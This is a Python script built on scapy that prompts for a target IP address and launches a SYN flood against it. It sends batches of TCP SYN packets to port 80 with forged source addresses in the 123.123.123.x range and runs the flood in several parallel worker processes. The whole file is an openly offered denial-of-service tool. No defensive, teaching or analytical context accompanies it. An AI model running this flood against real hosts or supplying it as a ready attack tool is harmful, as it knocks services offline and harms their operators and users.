import scapy.all as scapy
import os

from multiprocessing import Pool



clear = os.system('clear')
print("**************************************")
print("             SYN_Flood")
print("**************************************")
print("Please input your target's IP ")
target = input("[SYN_Flood]#")
p = {}

def SYN_Flood_End():
	print("SYN_Flood_End!")
	p.terminate()

def SYN_Flood(name):


	num =0
	i =1
	
	try:
		while True:
			if (i > 0) is True:
				i += 1
				src_ip ="123.123.123."+str(i)				
			packet =scapy.IP(src=src_ip,dst=target)/scapy.TCP(sport=scapy.RandShort(),dport=80,flags="S")	
			scapy.send(packet,count=1500,verbose=False)		
			num += 1
			print("Process:%s,Attack:%s"%(name,num))
	except KeyboardInterrupt:
		print("Go back")
def process():
	global p
	p = Pool(2)
	for i in range(3):
		p.apply_async(SYN_Flood,args=(i,))
	print('Waiting for all subprocesses done...')
	p.close()
	p.join()
	print('All subprocesses done.')

